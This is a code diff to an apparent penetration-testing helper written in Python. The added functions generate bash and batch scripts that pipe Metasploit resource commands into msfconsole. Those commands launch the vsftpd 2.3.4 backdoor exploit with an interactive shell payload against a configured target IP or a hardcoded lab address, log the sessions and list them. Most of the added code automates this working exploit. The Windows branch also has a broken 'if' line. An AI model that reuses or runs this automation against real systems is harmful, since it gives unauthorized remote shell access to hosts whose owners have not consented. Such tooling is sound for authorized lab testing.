@@ -15,6 +15,8 @@ def main(client):
             os.system('cls' if os.name == 'nt' else 'clear')
             print('Executing rc file via msfconsole')
             run_resource_script(client)
+        elif command == '3':
+            test_shell()
         elif command == '0':
             os.system('cls' if os.name == 'nt' else 'clear')
             break
@@ -25,10 +27,110 @@ def main(client):
 if __name__ == "__main__":
     main()
 
-def generate_resource_script(commands):
-    with open(base.LOCAL_PATH +'resource_script.rc', 'w') as f:
-        for command in commands:
-            f.write(command + '\n')
+def generate_resource_script(commands,filename,targetos):
+    ttl = base.settings['TTL']
+    ip_address = base.settings['target_ip']
+    if(targetos == 'linux'):
+        with open(base.LOCAL_PATH + filename +'.sh', 'w', newline='\n') as f:
+            f.write(f"#!/bin/bash\n")
+            f.write(f"which msfconsole > /dev/null 2>&1\n")
+            f.write(f"if [ $? -ne 0 ]; then\n")
+            f.write(f'  echo "Metasploit is not installed. Please install it and try again."\n')
+            f.write(f"  exit 1\n")
+            f.write(f"fi\n")
+            f.write('now=$(date +"%Y%m%d_%H%M%S")\n')
+            f.write(f'resource_file="\n') # start resource file text
+            f.write(f'setg RHOSTS {ip_address}\n')
+            f.write(f'setg LHOSTS 127.0.0.1\n')
+            #loop
+            for command in commands:
+                f.write(command + '\n')
+            f.write(f'use exploit/unix/ftp/vsftpd_234_backdoor\n')
+            f.write(f'set PAYLOAD cmd/unix/interact\n')
+            #end loop
+            f.write(f'spool /shared-vol/rc_report_$now.txt\n')
+            f.write(f'run -j -z\n')
+            f.write(f'sleep {ttl}\n')
+            f.write(f'sessions -v\n')
+            f.write(f'spool off\n')
+            f.write(f'exit -y\n')
+            # f.write(f"echo \"use exploit/unix/ftp/vsftpd_234_backdoor\" > /tmp/resource.rc\n")
+            # f.write(f"echo \"set PAYLOAD {payload}\" >> /tmp/resource.rc\n")
+            # f.write(f"echo \"set RHOSTS {lhost}\" >> /tmp/resource.rc\n")
+            f.write(f'"\n')
+            f.write(f'echo "$resource_file" | msfconsole -q -r /dev/stdin')
+
+        os.chmod(base.LOCAL_PATH + filename +'.sh', 0o755)
+        with open(base.LOCAL_PATH + filename +'.sh', 'rb') as f:
+            content = f.read()
+        with open(base.LOCAL_PATH + filename +'.sh', 'wb') as f:
+            f.write(content.replace(b'\r\n', b'\n'))
+    elif(targetos == 'window'):
+        with open(base.LOCAL_PATH + filename +'.bat', 'w', newline='\n') as f:
+            f.write(f"@echo off\n")
+            f.write(f"where msfconsole >nul 2>&1\n")
+            f.write(f" %errorlevel% neq 0 (\n")
+            f.write(f'  echo "Metasploit is not installed. Please install it and try again."\n')
+            f.write(f"  exit /b 1\n")
+            f.write(f")\n")
+            f.write('set now=%date:~10,4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%\n')
+            f.write(f'set resource_file=^\n') # start resource file text
+            f.write(f'setg RHOSTS {ip_address}^\n')
+            f.write(f'^setg LHOSTS 127.0.0.1^\n')
+            #loop
+            for command in commands:
+                f.write('^'+command + '^\n')
+            #end loop
+            f.write(f'^spool /shared-vol/rc_report_$now.txt^\n')
+            f.write(f'^run -j -z^\n')
+            f.write(f'^sleep {ttl}^\n')
+            f.write(f'^sessions -v^\n')
+            f.write(f'^spool off^\n')
+            f.write(f'^exit -y^\n')
+            # f.write(f"echo \"use exploit/unix/ftp/vsftpd_234_backdoor\" > /tmp/resource.rc\n")
+            # f.write(f"echo \"set PAYLOAD {payload}\" >> /tmp/resource.rc\n")
+            # f.write(f"echo \"set RHOSTS {lhost}\" >> /tmp/resource.rc\n")
+            f.write(f'^\n')
+            f.write(f'echo %resource_file% | msfconsole -q -r -')
+    
+        
+
+def test_shell():
+    # Set the listener options
+    payload = "cmd/unix/interact"
+    lhost = "192.168.184.129"
+    lport = "4444"
+    # Create the shell script
+    with open(base.LOCAL_PATH +"msf_listener.sh", "w") as f:
+        f.write(f"#!/bin/bash\n")
+        f.write(f"which msfconsole > /dev/null 2>&1\n")
+        f.write(f"if [ $? -ne 0 ]; then\n")
+        f.write(f'  echo "Metasploit is not installed. Please install it and try again."\n')
+        f.write(f"  exit 1\n")
+        f.write(f"fi\n")
+        f.write('now=$(date +"%Y%m%d_%H%M%S")\n')
+        f.write(f'resource_file="\n') # start resource file text
+        f.write(f'setg RHOSTS 192.168.184.129\n')
+        f.write(f'setg LHOSTS 127.0.0.1\n')
+        #loop
+        f.write(f'use exploit/unix/ftp/vsftpd_234_backdoor\n')
+        f.write(f'set PAYLOAD cmd/unix/interact\n')
+        f.write(f'spool /shared-vol/rc_report_$now.txt\n')
+        #end loop
+        f.write(f'run -j -z\n')
+        f.write(f'sleep 15\n')
+        f.write(f'sessions -v\n')
+        f.write(f'spool off\n')
+        f.write(f'exit -y\n')
+        # f.write(f"echo \"use exploit/unix/ftp/vsftpd_234_backdoor\" > /tmp/resource.rc\n")
+        # f.write(f"echo \"set PAYLOAD {payload}\" >> /tmp/resource.rc\n")
+        # f.write(f"echo \"set RHOSTS {lhost}\" >> /tmp/resource.rc\n")
+        f.write(f'"\n')
+        f.write(f'echo "$resource_file" | msfconsole -q -r /dev/stdin')
+
+
+    # Make the shell script executable
+    os.chmod(base.LOCAL_PATH +"msf_listener.sh", 0o755)
 
 def run_resource_script(msf_client):
     # result = msf_client.modules.execute('resource', constant.resouce_path)
